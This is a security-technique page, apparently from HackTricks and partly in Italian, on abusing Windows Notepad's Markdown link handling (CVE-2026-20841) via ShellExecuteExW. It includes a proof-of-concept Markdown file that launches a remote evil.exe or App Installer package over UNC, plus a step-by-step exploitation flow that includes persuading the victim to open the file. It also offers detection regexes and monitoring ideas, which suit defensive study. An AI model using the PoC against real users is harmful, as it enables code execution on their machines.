# Windows Protocol Handler / ShellExecute Abuse (Markdown Renderers)

{{#include ../banners/hacktricks-training.md}}

Le moderne applicazioni Windows che renderizzano Markdown/HTML spesso trasformano i link forniti dall'utente in elementi cliccabili e li passano a `ShellExecuteExW`. Senza un'allowlisting rigorosa degli schemi, qualsiasi protocol handler registrato (es. `file:`, `ms-appinstaller:`) può essere attivato, portando all'esecuzione di codice nel contesto dell'utente corrente.

## ShellExecuteExW surface in Windows Notepad Markdown mode
- Notepad chooses Markdown mode **only for `.md` extensions** via a fixed string comparison in `sub_1400ED5D0()`.
- Supported Markdown links:
- Standard: `[text](target)`
- Autolink: `<target>` (rendered as `[target](target)`), so both syntaxes matter for payloads and detections.
- Link clicks are processed in `sub_140170F60()`, which performs weak filtering and then calls `ShellExecuteExW`.
- `ShellExecuteExW` dispatches to **any configured protocol handler**, not just HTTP(S).

### Payload considerations
- Any `\\` sequences in the link are **normalized to `\`** before `ShellExecuteExW`, impacting UNC/path crafting and detection.
- `.md` files are **not associated with Notepad by default**; the victim must still open the file in Notepad and click the link, but once rendered, the link is clickable.
- Dangerous example schemes:
- `file://` to launch a local/UNC payload.
- `ms-appinstaller://` to trigger App Installer flows. Other locally registered schemes may also be abusable.

### Minimal PoC Markdown
```markdown
[run](file://\\192.0.2.10\\share\\evil.exe)
<ms-appinstaller://\\192.0.2.10\\share\\pkg.appinstaller>
```
### Flusso di exploitation
1. Crea un **`.md` file** in modo che Notepad lo renda come Markdown.
2. Incorpora un link usando uno schema URI pericoloso (`file:`, `ms-appinstaller:`, o qualsiasi handler installato).
3. Consegna il file (HTTP/HTTPS/FTP/IMAP/NFS/POP3/SMTP/SMB o simili) e convinci l'utente ad aprirlo in Notepad.
4. Al clic, il **link normalizzato** viene passato a `ShellExecuteExW` e il corrispondente protocol handler esegue il contenuto referenziato nel contesto dell'utente.

## Idee per il rilevamento
- Monitora i trasferimenti di file `.md` su porte/protocolli che comunemente veicolano documenti: `20/21 (FTP)`, `80 (HTTP)`, `443 (HTTPS)`, `110 (POP3)`, `143 (IMAP)`, `25/587 (SMTP)`, `139/445 (SMB/CIFS)`, `2049 (NFS)`, `111 (portmap)`.
- Analizza i link Markdown (standard e autolink) e cerca `file:` o `ms-appinstaller:` **indipendentemente dalle maiuscole/minuscole**.
- Regex fornite dal vendor per intercettare l'accesso a risorse remote:
```
(\x3C|\[[^\x5d]+\]\()file:(\x2f|\x5c\x5c){4}
(\x3C|\[[^\x5d]+\]\()ms-appinstaller:(\x2f|\x5c\x5c){2}
```
- Il comportamento della patch riportato **allowlists local files and HTTP(S)**; tutto il resto che raggiunge `ShellExecuteExW` è sospetto. Estendere le rilevazioni ad altri gestori di protocollo installati, se necessario, poiché la superficie di attacco varia a seconda del sistema.

## Riferimenti
- [CVE-2026-20841: Arbitrary Code Execution in the Windows Notepad](https://www.thezdi.com/blog/2026/2/19/cve-2026-20841-arbitrary-code-execution-in-the-windows-notepad)
- [CVE-2026-20841 PoC](https://github.com/BTtea/CVE-2026-20841-PoC)

{{#include ../banners/hacktricks-training.md}}
